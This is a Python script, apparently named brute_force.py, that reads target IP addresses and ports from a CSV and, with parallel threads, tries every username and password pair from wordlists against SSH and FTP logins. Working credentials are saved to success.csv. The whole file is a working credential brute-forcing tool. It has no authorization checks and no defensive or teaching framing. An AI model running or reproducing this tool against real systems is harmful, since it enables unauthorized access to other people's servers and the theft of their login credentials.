import csv
import paramiko
from ftplib import FTP
import nmap
import sys
import concurrent.futures
from functools import partial


MAX_WORKERS = 10


def load_credentials(file_path):
    with open(file_path, "r", encoding="utf-8", errors="ignore") as file:
        return file.read().splitlines() + [""]


def log_success(ip, port, username, password):
    with open("success.csv", "a", newline="") as file:
        csv_writer = csv.writer(file)
        csv_writer.writerow([ip, port, username, password])
    print(f"Logged success for {ip}:{port} with {username}:{password}")


def try_ssh(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=10)
        ssh.close()
        log_success(ip, port, username, password)
        return f"SSH Success: {ip}:{port} with {username}:{password}"
    except Exception as e:
        return f"SSH Failed: {ip}:{port} with {username}:{password} - {e}"


def try_ftp(ip, port, username, password):
    try:
        ftp = FTP(timeout=10)
        ftp.connect(ip, port)
        ftp.login(username, password)
        ftp.quit()
        log_success(ip, port, username, password)
        return f"FTP Success: {ip}:{port} with {username}:{password}"
    except Exception as e:
        return f"FTP Failed: {ip}:{port} with {username}:{password} - {e}"


def scan(ip, port, credentials):
    if port == 22:
        for username, password in credentials:
            result = try_ssh(ip, port, username, password)
            print(result)
            if "Success" in result:
                break
    elif port == 21:
        for username, password in credentials:
            result = try_ftp(ip, port, username, password)
            print(result)
            if "Success" in result:
                break


def main(csv_path, usernames_path, passwords_path):
    usernames = load_credentials(usernames_path)
    passwords = load_credentials(passwords_path)
    credentials = [(u, p) for u in usernames for p in passwords]

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        with open(csv_path, "r") as file:
            csv_reader = csv.DictReader(file)
            for row in csv_reader:
                ip = row["ipaddress"]
                port = int(row["port"])

                future = executor.submit(partial(scan, ip, port, credentials))
                futures.append(future)

        for future in concurrent.futures.as_completed(futures):
            print(future.result())


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python brute_force.py <csv_path>")
        sys.exit(1)
    csv_path = sys.argv[1]
    usernames_path = "usernames.txt"
    passwords_path = "passwords.txt"
    main(csv_path, usernames_path, passwords_path)
